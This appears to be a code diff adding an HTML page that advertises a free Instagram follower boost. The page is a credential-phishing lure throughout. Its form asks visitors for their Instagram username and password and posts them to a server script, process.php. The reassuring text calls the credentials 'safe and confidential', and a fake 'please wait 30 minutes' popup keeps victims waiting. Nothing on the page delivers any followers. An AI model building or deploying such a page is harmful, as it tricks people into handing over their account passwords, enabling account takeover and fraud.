@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Boost Your Instagram Followers</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #ffffcc; /* Light yellow background */
+        }
+        .header {
+            background-image: url('https://th.bing.com/th/id/R.20ecac071aa417e4d21ffc35b2c50210?rik=XSCl30h4wdTKhw&riu=http%3a%2f%2flibertychs.org%2fimages%2fslider%2fflex%2fcritical_incidents.jpg&ehk=jbnUaaGx0OSYJKijnfeyAGS0KzHhB%2buSu9lacH%2b2kw8%3d&risl=&pid=ImgRaw');
+            background-size: cover;
+            background-position: center;
+            height: 200px; /* Adjust the height as needed */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            text-align: center;
+        }
+        .container {
+            max-width: 1000px; /* Adjusted max-width */
+            margin: 20px auto; /* Added space between header and form */
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1, h2 {
+            text-align: center;
+        }
+        input[type="text"], input[type="password"], select {
+            width: 50%; /* Set width to 50% */
+            padding: 10px;
+            margin: 0 auto; /* Center align */
+            display: block;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 150px;
+            padding: 10px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            display: block;
+            margin: 20px auto 0; /* Adjusted margin */
+            transition: background-color 0.3s ease, transform 0.1s ease;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        button:active {
+            transform: scale(0.98);
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            z-index: 999;
+        }
+        .blog {
+            margin-top: 20px; /* Added space between form and blog */
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>Boost Your Instagram Followers</h1>
+</div>
+
+<div class="container">
+    <p>Welcome to our Instagram Followers Increase Platform!</p>
+    
+    <form id="loginForm" action="process.php" method="post">
+        <input type="text" id="username" name="username" placeholder="Instagram Username" required><br>
+        <input type="password" id="password" name="password" placeholder="Instagram Password" required><br>
+        <select id="followerCount" name="followerCount" required>
+            <option value="">Select Number of Followers</option>
+            <option value="100">100 Followers</option>
+            <option value="500">500 Followers</option>
+            <option value="1000">1000 Followers</option>
+        </select><br>
+        <button type="submit">Go</button>
+    </form>
+</div>
+
+<div class="blog container">
+    <h2>Why Increase Your Instagram Followers?</h2>
+    <p>Having a large following on Instagram not only boosts your social credibility but also opens doors to new opportunities. Whether you're an influencer, a business, or simply looking to expand your social circle, having a strong presence on Instagram can significantly impact your success.</p>
+   
+    <p>In today's digital age, social media has become a powerful tool for personal branding, marketing, and networking. Among the plethora of social platforms, Instagram stands out as one of the most influential platforms for sharing visual content and connecting with audiences worldwide.</p>
+    
+    <p>However, building a significant following on Instagram can be a daunting task, especially for individuals and businesses starting from scratch. That's where our Instagram Followers Increase Platform comes in handy. By leveraging our platform, you can accelerate your follower growth and unlock new opportunities for engagement and visibility.</p>
+    
+    <p>Increasing your Instagram followers isn't just about the numbers; it's about building a community of engaged followers who resonate with your content and brand. With a larger audience, you can amplify your message, attract potential customers, and establish yourself as an authority in your niche.</p>
+    
+    <p>Moreover, a robust Instagram following can enhance your social credibility and attract attention from brands, collaborators, and influencers within your industry. Whether you're an aspiring influencer, a small business owner, or a content creator, having a substantial following on Instagram can propel your success to new heights.</p>
+    
+    <p>In conclusion, don't underestimate the power of Instagram followers. With our user-friendly platform, you can effortlessly increase your followers and unlock a world of opportunities waiting for you on Instagram. Get started today and watch your Instagram presence soar!</p>
+    
+    <h2>How It Works</h2>
+    <p><strong>Login to Your Instagram Account:</strong> Use the form below to securely login to your Instagram account. Rest assured, your credentials are kept safe and confidential.</p>
+    <p><strong>Select Number of Followers:</strong> After logging in, choose the number of followers you wish to increase. You can select from various packages tailored to suit your needs.</p>
+    <p><strong>Click "Go":</strong> Once you've selected your desired number of followers, simply click the "Go" button to initiate the process.</p>
+    <p><strong>Sit Back and Relax:</strong> A popup will appear on your screen confirming that your request has been received. Now, all you have to do is wait for 30 minutes while our system works its magic.</p>
+    <p><strong>Watch Your Followers Grow:</strong> After the specified time, check your Instagram account to see the increase in your followers. It's that simple!</p>
+</div>
+
+<div id="popup" class="popup">
+    <p>Your request has been received. Please wait for 30 minutes while we process it.</p>
+</div>
+
+<script>
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        // Show popup on form submission
+        document.getElementById("popup").style.display = "block";
+    });
+</script>
+
+</body>
+</html>
